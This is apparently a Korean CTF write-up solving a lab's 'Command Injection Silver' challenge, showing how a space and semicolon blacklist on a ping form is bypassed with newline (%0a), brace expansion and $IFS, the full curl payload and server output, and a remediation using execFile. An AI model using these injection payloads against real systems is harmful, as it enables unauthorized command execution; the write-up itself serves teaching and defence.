+++
title = "VulnABLE CTF [LUXORA] Write-up: Command Injection 🥈 Silver"
description = "LUXORA 플랫폼의 Command Injection Silver 난이도 공백/특수문자 필터링 우회 완벽 공략 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Silver", "Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Command Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (CMDi)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/cmdi/silver`
- **목표**: 띄어쓰기(공백)와 세미콜론(`;`) 같은 주요 메타문자가 차단된 환경에서 리눅스 쉘의 고급 문법을 활용하여 필터를 우회하고 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 반응 분석 (Reconnaissance)

`/cmdi/silver` 역시 Bronze와 동일한 Ping 테스트 페이지입니다.
Bronze에서 성공했던 기본 페이로드(`8.8.8.8; id`)를 다시 시도해 봅니다.

```http
POST /cmdi/silver
ip=8.8.8.8; id
```

**[서버의 에러 응답]**
```text
[Blocked] Invalid characters detected! Spaces and semicolons are not allowed.
```

**[해커의 사고 과정]**
1. 백엔드에서 사용자 입력을 쉘에 넘기기 전에 `공백(Space)`과 `세미콜론(;)`을 막아버렸다.
2. 추가로 `&&`, `||`, `|` 같은 기호들을 넣어보았으나 동일하게 차단된다.
3. 이를 우회하려면 **명령어를 구분하는 다른 방법**과 **공백을 대체할 수 있는 쉘 변수**가 필요하다!

---

## 💥 2. 필터링 우회 전략 (Bypass Strategy)

리눅스 Bash 쉘은 개발자의 상상을 초월하는 유연성을 가지고 있습니다. 막힌 문자를 다른 방식으로 표현하는 우회 기법을 설계합니다.

### 💡 전략 1: 명령어 구분자(Separator) 우회
세미콜론(`;`)이나 `&&`가 막혔다면, 리눅스 터미널에서 엔터를 치는 것과 동일한 효과를 내는 **개행 문자(New Line, `\n`)**를 사용합니다.
URL 인코딩을 하면 `%0a` 가 됩니다.

### 💡 전략 2: 공백(Space) 우회
`cat flag.txt` 를 치고 싶은데 스페이스바가 막혔습니다. 다음 세 가지 방법 중 하나를 씁니다.
1. **입력 재지정(Redirection)**: `cat<flag.txt` (명령어와 타겟 사이에 꺾쇠를 넣어 공백 생략)
2. **중괄호 확장(Brace Expansion)**: `{cat,flag.txt}` (Bash가 알아서 `cat flag.txt`로 펼쳐줌)
3. **내장 환경변수 `$IFS` 사용**: 리눅스에는 단어를 구분하는 기본 변수(Internal Field Separator)인 `$IFS`가 있습니다. 기본값이 공백, 탭, 개행이므로 스페이스바 대신 쓸 수 있습니다. (예: `cat$IFS/flag.txt`)

---

## 🚀 3. 공격 수행 및 페이로드 조립 (Exploitation)

가장 보편적인 우회 방식인 `%0a`와 `$IFS`를 조합하여 페이로드를 만듭니다.

### 페이로드 조립
목표 명령어: `ping 8.8.8.8` 이후에 `cat flag_silver.txt` 실행
1. IP 입력: `8.8.8.8`
2. 명령어 분리: `%0a` 삽입
3. 명령어 작성 (공백 제거): `cat$IFS/flag_silver.txt`

완성된 URL 인코딩 문자열:
`ip=8.8.8.8%0acat$IFS/flag_silver.txt`

### 페이로드 전송
```bash
# curl 명령어를 이용한 POST 요청 전송
$ curl -X POST http://localhost:3000/cmdi/silver \
  -d "ip=8.8.8.8%0acat\$IFS/flag_silver.txt"
```

### 🔍 서버의 응답
애플리케이션 필터 로직은 입력값 안에 스페이스나 세미콜론이 없으므로 "안전하다"고 판단하여 쉘로 넘겼습니다. 쉘은 `%0a`를 엔터로, `$IFS`를 스페이스로 완벽히 해석하여 파일을 읽어냈습니다!

```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms
...
FLAG{CMDI_🥈_IFS_BYPASS_A1B2C3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

블랙리스트 방식의 필터링은 리눅스 쉘의 풍부한 문법적 특징 앞에서는 종이 방패에 불과하다는 것을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{CMDI_🥈_IFS_BYPASS_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
근본 원인은 여전히 사용자 입력을 쉘 인터프리터(`sh -c`)로 파싱하게 놔두었기 때문입니다. 아무리 문자를 꼼꼼히 막아도 쉘은 항상 빠져나갈 구멍을 제공합니다.

* **안전한 패치 코드 (execFile 활용 및 쉘 파싱 비활성화)**
Node.js 환경에서는 `exec` 대신 `execFile`을 사용하면 쉘 문법이 동작하지 않습니다.
```javascript
const { execFile } = require('child_process');

// 두 번째 인자로 배열을 넘기면, 이 값들은 쉘(sh)을 거치지 않고 직접 ping 바이너리의 인자로 꽂힙니다.
// 따라서 %0a 나 $IFS 가 들어가더라도 단순한 '잘못된 IP 문자열'로 처리되어 에러가 납니다.
execFile('ping', ['-c', '4', req.body.ip], (err, stdout, stderr) => {
    // 결과 처리
});
```